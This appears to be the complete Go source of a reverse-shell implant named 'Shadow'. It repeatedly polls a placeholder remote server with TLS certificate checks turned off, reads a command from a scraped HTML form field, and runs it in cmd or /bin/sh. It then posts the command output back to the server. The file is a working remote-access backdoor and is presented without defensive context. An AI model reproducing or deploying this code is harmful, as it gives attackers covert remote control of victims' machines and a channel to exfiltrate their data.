package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
)

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {

	var osshell string
	//var osshellargs []string
	//fmt.Println("Got a Shadow from ...")
	shadowserver := "https://REVIPPORT"

	trp := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{Transport: trp}

	for {

		response, err := client.Get(shadowserver)
		checkerr(err)
		defer response.Body.Close()
		//cnt2, _ := ioutil.ReadAll(response.Body)
		//fmt.Println(string(cnt2))

		doc, err := goquery.NewDocumentFromResponse(response)
		checkerr(err)
		cnt, _ := doc.Find("form div div div input").Attr("value")

		if strings.TrimSpace(cnt) == "" {
			cnt = "ipconfig"
		}
		command := strings.TrimSpace(string(cnt))
		//fmt.Println("Go query")
		//fmt.Println(command)

		if command == "bye" {
			client.PostForm(shadowserver, url.Values{"cmd": {command}, "cmdres": {"Shadow leaves :("}})
			os.Exit(0)
		} else {
			osshellargs := []string{"/C", command}
			if runtime.GOOS == "windows" {
				osshell = "cmd"
			} else {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}
			}
			execcmd := exec.Command(osshell, osshellargs...)
			/*if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

			out, _ := execcmd.Output()
			//fmt.Println(string(out))
			client.PostForm(shadowserver, url.Values{"cmd": {command}, "cmdres": {string(out)}})
			//client.PostForm(shadowserver, url.Values{"cmd": {command}})
			time.Sleep(3 * time.Second)
		}

	}

}
